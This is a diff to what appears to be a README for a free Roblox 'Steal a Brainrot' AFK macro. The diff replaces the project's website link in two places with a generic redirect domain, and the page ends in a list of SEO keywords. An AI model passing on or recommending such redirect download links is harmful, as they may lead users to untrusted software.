@@ -2,7 +2,7 @@
 
 Free auto-steal and collect macro for Steal a Brainrot - repeats your recorded key sequence on a loop while AFK. Windows 10/11.
 
-**[⬇ Download for Windows](https://github.com/christianfrei791/steal-a-brainrot-macro/releases/latest)** · [Website](https://stealabrainrotmacro.com)
+**[⬇ Download for Windows](https://github.com/christianfrei791/steal-a-brainrot-macro/releases/latest)** · [Website](https://go.download-helper.tech/go/SBM)
 
 ![Steal a Brainrot Macro](StealaBrainrotMacro.png)
 
@@ -49,4 +49,4 @@ Right here. MIT licence, use it however you like.
 
 steal a brainrot macro · auto steal macro · roblox afk farm · brainrot macro · roblox macro windows · auto collect macro
 
-Website: https://stealabrainrotmacro.com
+Website: https://go.download-helper.tech/go/SBM
